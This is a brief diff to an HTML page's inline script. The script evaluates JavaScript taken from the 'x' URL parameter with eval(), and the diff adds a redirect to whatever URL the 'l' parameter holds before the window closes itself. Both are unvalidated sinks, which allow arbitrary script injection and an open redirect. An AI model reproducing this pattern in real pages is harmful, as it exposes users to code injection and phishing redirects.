@@ -3,8 +3,15 @@
 <body>
 <script>
   try {
-    const cx = (new URLSearchParams(window.location.search)).get('x')
+    const sp = new URLSearchParams(window.location.search)
+    
+    const cx = sp.get('x')
+    const lx = sp.get('l')
+    
     if (cx) eval(decodeURIComponent(cx)) else throw null
+    if (lx) window.location = lx
+
+    throw null 
   } 
   catch { window.open('', '_self'), window.close() }
 </script>
